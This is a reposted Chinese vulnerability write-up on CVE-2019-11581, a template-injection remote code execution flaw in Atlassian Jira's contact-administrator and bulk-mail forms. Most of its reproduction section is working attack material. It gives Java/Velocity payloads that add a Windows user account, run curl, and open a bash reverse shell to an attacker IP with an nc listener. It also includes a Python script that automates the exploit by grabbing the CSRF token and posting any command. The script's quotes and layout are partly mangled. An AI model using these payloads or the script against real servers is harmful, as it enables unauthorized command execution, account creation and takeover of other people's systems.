# （CVE-2019-11581）Atlassian Jira 远程命令执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2833](https://www.zhihuifly.com/t/topic/2833)

# （CVE-2019-11581）Atlassian Jira 远程命令执行漏洞

## 一、漏洞简介

此漏洞由于Atlassian Jira中的Atlassian Jira Server和Jira Data Center模块存在模板注入，当”联系管理员表单“功能开启时，攻击者可以在表单插入java恶意代码,当服务端对传入数据进行解析时,会执行数据中插入的恶意代码,并执行其中的命令。**攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作**，对服务器造成巨大的影响。

## 二、漏洞影响

Atlassian Jira 4.4.x
Atlassian Jira 5.x.x
Atlassian Jira 6.x.x
Atlassian Jira 7.0.x
Atlassian Jira 7.1.x
Atlassian Jira 7.2.x
Atlassian Jira 7.3.x
Atlassian Jira 7.4.x
Atlassian Jira 7.5.x
Atlassian Jira 7.6.x < 7.6.14
Atlassian Jira 7.7.x
Atlassian Jira 7.8.x
Atlassian Jira 7.9.x
Atlassian Jira 7.10.x
Atlassian Jira 7.11.x
Atlassian Jira 7.12.x
Atlassian Jira 7.13.x < 7.13.5
Atlassian Jira 8.0.x < 8.0.3
Atlassian Jira 8.1.x < 8.1.2
Atlassian Jira 8.2.x < 8.2.3

## 三、复现过程

### 漏洞分析

**1.利用前提条件：**

第一种，未授权代码执行利用条件：Jira已配置好SMTP服务器，且需开启“联系网站管理员表单”功能。（从WEB界面设计上看，实际上如果没配置SMTP服务器，无法开启此功能

第二种利用场景前提是拿到Jira管理员的权限，利用条件较难满足，这里主要分析第一种情况。原因在于atlassian-jira/WEB-INF/classes/com/atlassian/jira/web/action/user/ContactAdministrators 未对Subject（邮件主题）处进行过滤，用户传入的邮件主题被当作template（模板）指令执行。在任何一种情况下，成功利用此漏洞的攻击者都可在运行受影响版本的Jira Server或Jira Data Center的系统上执行任意命令。

**2.以下两种url漏洞验证方式：**

第一种无需管理员账户权限：http://www.0-sec.org:8080[/secure/ContactAdministrators!default.jspa](http://ip:port/secure/ContactAdministrators!default.jspa)

![image](img/ca2e3d4187cc5e1e53fdaceac46b146b.png)

第二种需管理员账户权限：http://www.0-sec.org:8080/secure/admin/SendBulkMail!default.jspa

![image](img/24f89d35ccba016e256a7c6c3813b40b.png)

### 漏洞复现

**1\. 漏洞利用条件**

联系管理员处必须开启 （需要知道后台管理员账号密码）

**2.环境准备：**

Atlassian JIRAv7.13.0 (以该版本为例，该版本存在漏洞)下载地址：

https://product-downloads.atlassian.com/software/jira/downloads/atlassian-jira-software-7.13.0-x64.exe

安装过程不再描述（按照提示进行安装，先在官方注册一个账号然后拿到一个试用期序列号并进行安装），注意，到了邮件配置那一步经尽量选以后(默认就是)，然后进入后台配置。

**3.确认未登陆状态下漏洞的存在**

访问如下URL（无需管理员账户权限）：

http://www.0-sec.org:8080/secure/ContactAdministrators!default.jspa

如果提示如下图，这说明没有配置联系管理员是无法触发漏洞。

![image](img/c6a72ee5b0ff52c278536ca7b69b07a8.png)

请登陆后台开启联系管理员，配置地址如下：

http://www.0-sec.org:8080/secure/admin/EditApplicationProperties!default.jspa

默认是关闭的，需要配置了STMP发信后才能开启，配置STMP的时候可以测试连接，服务器必须开25端口，不然不能发邮件，下图是开启成功

![image](img/8cffe608a05233e16512ab13a47d9770.png)

**4.未登陆状态下触发漏洞**

访问

http://www.0-sec.org:8080/secure/ContactAdministrators!default.jspa

![image](img/ccef8761cb4990be8386fef1880eec20.png)

在Subject填入payload，注意，我这里环境是windows机器，所以可以添加账号观察，Linux可以用反弹shell的代码等等,反正换成自己想执行的命令。

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('net user bk abc@ABC123 /add').waitFor() 
```

![image](img/7025b34058ceff56a1b353b70300944e.png)

发送了后可能会等一会儿，因为要加入邮件队列。这时候再上服务器执行net user查看，发现正是刚刚执行命令添加的账户。

![image](img/8e6a35dfd817d45744888544ac507ff7.png)

**5\. 登陆管理员账号触发漏洞**

登陆管理员账号，然后访问如下URL：

http://www.0-sec.org:8080/secure/admin/SendBulkMail!default.jspa

填入payload，如下，注意执行命令添加账号的账户名

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('net user bk01 abc@ABC123 /add').waitFor() 
```

![image](img/b21b95c548cc68f4f11ef64b684da2de.png)

![image](img/c5c3edc4bc7f2b13b82e3fddf5d32af4.png)

linux下可执行：

目标Jira系统可执行的POC

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://www.baidu.com').waitFor() 
```

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('bash -i >& /dev/tcp/攻击者IP/2333 0>&1').waitFor() 
```

攻击者主机执行:nc -lvvp 2333

### poc

> scan

```
#/usr/bin/python
# -*- coding: utf8 -*-

# the program intents to automate the process of exploiting CVE-2019-11581 During our engagments - quick and dirty

# I will probably will add features to make it more easy.

# Ths is some skeleton and probably things will not work on first run

# Importing

import requests

import sys

import argparse

from bs4 import BeautifulSoup

import cmd

parser = argparse.ArgumentParser()

parser.add_argument(“domain”, help=“JIRA Instance”)

parser.add_argument(“cmd”, help=“Command to run”)

args = parser.parse_args()

#Some Debugging Globals

http_proxy  = “[http://127.0.0.1:8080](http://127.0.0.1:8080)”

https_proxy = “[https://127.0.0.1:8080](https://127.0.0.1:8080)”

ftp_proxy   = “”

#Proxy Dictionary

proxyDict = {

“http”  : http_proxy,

“https” : https_proxy

}

headers = {‘UserAgent’:‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0’}

def JiraScan(domain,cmd):

#Filtering host

domain = domain + ‘/secure/ContactAdministrators!default.jspa’

#Checking if host is vulnerable by checking if specific string is present

s = requests.Session()

r = s.get(domain, proxies=proxyDict, verify=False)

html_doc = r.content

soup = BeautifulSoup(html_doc, ‘lxml’)

```
notvuln = soup.findAll("div",{"class":"aui-message aui-message-warning warningd"})
if notvuln:
    print "[-] Not Vulnerable"
else:
    print "[+] Checking if Vulnerable"
    #In order to have valid request we need to handle JIRA CSRF Tokens
    #Extracting atl_token from form
    html_doc = r.content
    soup = BeautifulSoup(html_doc, 'lxml')
    data = soup.findAll(attrs={"name" : "atl_token"})
    print data
    #Returning Token value
    token = data[0]['value']
    print token
    #Replacing path
    domain= domain.replace('!default.jspa','.jspa')
    # body of post request
     #(),'subject':"",'details':",'atl_token': value,'Send':'Send'}
    payload = "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('%s').waitFor()" % cmd
    qparams = (('from','JIRA@JIRA.com'),('subject',payload),('details',payload),('atl_token',token),('Send','Send'))

    #Final Payload
    attack = s.post(domain, headers = headers, data = qparams, proxies=proxyDict, verify=False) 
``` `if **name** == ‘**main**’:

JiraScan(args.domain,args.cmd)` 
```

## 参考链接

> https://www.cnblogs.com/backlion/p/11608439.html